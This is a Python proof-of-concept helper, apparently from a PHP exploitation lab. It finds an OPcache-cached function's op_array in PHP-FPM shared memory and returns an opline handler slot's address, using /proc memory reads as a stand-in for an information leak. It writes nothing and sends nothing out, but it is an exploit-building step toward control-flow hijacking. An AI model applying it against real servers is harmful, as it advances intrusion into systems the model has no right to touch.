#!/usr/bin/env python3
# INDEX: locate opcache op_array handler in shm | fpm | live worker /proc maps available
"""Offset-free location of an OPcache cached op_array handler in shared memory.

Given a live worker's /proc maps (SHM-aware), derive the SHM base (no-JIT: binbase
+ a .bss SHM pointer + one read; JIT: binbase - a constant delta), scan the SHM for
a named interned function's op_array, follow `opcodes`, and return the interior
opline's handler slot. Pure stdlib; reads /proc in the container as the lab
stand-in for a one-pointer disclosure. Lab/analysis use only, on systems you own.
"""
from __future__ import annotations

import os
import struct
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common import proc_gdb  # noqa: E402

# JIT builds: SHM is placed at a constant delta below the PIE == the reserved
# shmem size (opcache.memory_consumption + opcache.jit_buffer_size). Measured
# 0xc000000 (128M+64M) 4/4 restarts on this lab. => SHM = binbase - this delta.
JIT_SHM_BINBASE_DELTA = 0xc000000

DEFAULT_OPLINE = 4                 # an INTERIOR opline (opline[0]/RECV is inert)
ZEND_USER_FUNCTION = 2
ZEND_OP_SIZE = 32                  # sizeof(zend_op), handler at offset 0
OPCODES_FIELD_SCAN = 0x120         # bytes of zend_op_array to scan for `opcodes`
LAST_FIELD_OFF = 0x60              # zend_op_array->last (opcode count), 8.4.26


def scan_image_for_shm_pointer(compose_file, service, pid, maps, shm):
    """Scan the php-fpm image .data/.bss for qwords pointing into the SHM
    region. Returns (count, anchors) where anchors are (binbase_rel_off,
    value, shm_rel_off) -- proving SHM is recoverable from binbase + one read."""
    binbase = maps.binbase()
    lo, hi = shm["start"], shm["end"]
    anchors = []
    count = 0
    for seg in maps.image_rw():
        data = proc_gdb.dump_mem(compose_file, service, pid, seg["start"], seg["size"])
        for i in range(0, len(data) - 8, 8):
            (v,) = struct.unpack_from("<Q", data, i)
            if lo <= v < hi:
                count += 1
                if len(anchors) < 8:
                    va = seg["start"] + i
                    anchors.append((va - binbase, v, v - lo))
    return count, anchors


def derive_shm_base(compose_file, service, pid, maps):
    """Derive the SHM base two ways and corroborate against /proc:
      no-JIT: binbase + a .bss SHM pointer + ONE read (the deref).
      JIT   : binbase - 0xc000000 (pure arithmetic, 0 reads).
    Returns a dict with the proc-observed base, the .bss anchor, and the
    JIT-constant candidate."""
    shm = maps.opcache_shm()
    binbase = maps.binbase()
    proc_base = shm["start"] if shm else None
    # .bss-pointer route (no-JIT): count qwords in the image that point into
    # SHM; the first is the anchor whose deref yields the base with one read.
    cnt, anchors = scan_image_for_shm_pointer(
        compose_file, service, pid, maps, shm) if shm else (0, [])
    bss_anchor = anchors[0] if anchors else None  # (binbase_rel_off, value, shm_rel_off)
    jit_candidate = (binbase - JIT_SHM_BINBASE_DELTA) if binbase else None
    return {
        "binbase": binbase,
        "proc_shm_base": proc_base,
        "shm_size": shm["size"] if shm else None,
        "shm_perm": shm["perm"] if shm else None,
        "image_shm_pointers": cnt,
        "bss_anchor": bss_anchor,             # binbase+off -> (points to) SHM
        "bss_derived_base": (proc_base if bss_anchor else None),  # deref == base
        "jit_derived_base": jit_candidate,
        "jit_matches_proc": (jit_candidate == proc_base),
    }


def locate_cached_handler(compose_file, service, pid, maps, func,
                          opline_index=DEFAULT_OPLINE, dump_mb=40):
    """Offset-free: scan the SHM for the interned func name, cross-reference
    the op_array, find `opcodes`, return the interior opline handler slot."""
    shm = maps.opcache_shm()
    tx = None
    for x in maps.rows:
        if x["perm"] == "r-xp" and x["path"].endswith(("/php-fpm", "/php")):
            tx = (x["start"], x["end"]); break
    if not shm or not tx:
        return None
    base = shm["start"]
    raw = proc_gdb.dump_mem(compose_file, service, pid, base,
                            min(dump_mb << 20, shm["size"]))
    name = func.encode() + b"\x00"
    tx_lo, tx_hi = tx

    def inshm(v): return base <= v < shm["end"]
    def intext(v): return tx_lo <= v < tx_hi

    i = 0
    while True:
        i = raw.find(name, i)
        if i < 0:
            break
        straddr = base + i - 24            # zend_string: gc(8)+h(8)+len(8)+val
        off = straddr - base
        if off >= 0 and struct.unpack_from("<Q", raw, off + 16)[0] == len(func):
            patt = struct.pack("<Q", straddr)
            j = 0
            while True:
                j = raw.find(patt, j)
                if j < 0:
                    break
                oa = base + j - 8          # function_name at op_array+8
                oo = oa - base
                if 0 <= oo < len(raw) and raw[oo] == ZEND_USER_FUNCTION:
                    for fo in range(0, OPCODES_FIELD_SCAN, 8):
                        if oo + fo + 8 > len(raw):
                            break
                        cand = struct.unpack_from("<Q", raw, oo + fo)[0]
                        if inshm(cand):
                            co = cand - base
                            if 0 <= co + 8 <= len(raw) and intext(
                                    struct.unpack_from("<Q", raw, co)[0]):
                                last = struct.unpack_from("<I", raw, oo + LAST_FIELD_OFF)[0]
                                k = opline_index if opline_index < last else max(1, last - 1)
                                slot = cand + k * ZEND_OP_SIZE
                                orig = (struct.unpack_from("<Q", raw, (slot - base))[0]
                                        if base <= slot < shm["end"] else None)
                                return {
                                    "op_array": oa, "opcodes": cand, "last": last,
                                    "opline_index": k, "handler_slot": slot,
                                    "orig_handler": orig,
                                    "func_name_str": straddr,
                                    "shm": (shm["start"], shm["end"]), "text": tx,
                                }
                j += 1
        i += 1
    return None
